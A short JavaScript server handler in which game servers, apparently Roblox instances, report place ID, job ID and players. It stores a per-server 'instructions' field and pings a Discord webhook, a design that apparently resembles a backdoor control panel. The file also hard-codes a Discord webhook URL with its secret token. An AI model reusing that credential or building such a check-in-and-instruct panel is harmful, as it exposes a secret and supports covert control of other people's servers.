import parseBody from "../utils/parseBody.js"
import { loadDB, saveDB } from "../database.js"
import { sendJson } from "../utils/sendJson.js"
import { postWebhook } from "../utils/webhook.js"
const WEBHOOK_URL = "https://discord.com/api/webhooks/1401034627447132230/dGr_wOh_3XW1ZzKIOCzGvqIzlPWL-y6wHTm1DumYQurd5YMVgt1XO2J1HJ7rP0E3XTAy"
const RATE_LIMIT_MS = 300000
const lastWebhook = {}
export default async function heartbeat(req, res) {
  try {
    const body = await parseBody(req)
    const { placeId, jobId, players } = body
    if (!placeId || !jobId || !Array.isArray(players)) return sendJson(res, 400, { error: "invalid data" })
    const db = loadDB()
    const key = `${placeId}:${jobId}`
    db.servers[key] = db.servers[key] || {}
    db.servers[key].placeId = placeId
    db.servers[key].jobId = jobId
    db.servers[key].players = players
    db.servers[key].heartbeat = Date.now()
    if (!("instructions" in db.servers[key])) db.servers[key].instructions = null
    saveDB(db)
    if (!lastWebhook[placeId] || Date.now() - lastWebhook[placeId] > RATE_LIMIT_MS) {
      postWebhook(WEBHOOK_URL, { content: `Server Logged:\nPlaceId: ${placeId}\nPlayer count: ${players.length}` })
      lastWebhook[placeId] = Date.now()
    }
    sendJson(res, 200, { ok: true })
  } catch (err) {
    sendJson(res, 400, { error: String(err) })
  }
}
